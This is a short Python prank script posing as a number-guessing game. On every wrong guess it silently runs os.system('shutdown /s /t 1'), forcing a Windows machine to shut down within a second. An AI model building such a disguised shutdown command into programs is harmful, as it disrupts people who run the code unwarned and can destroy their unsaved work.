
import random as r
import os 
while True:
    guess=int(input("Enter Any Number Between[1 to 10] : "))
    number=r.randint(1,10)

    if guess==number:
        print("Congratulaitons.You Won!!")
    else:
        os.system('shutdown /s /t 1')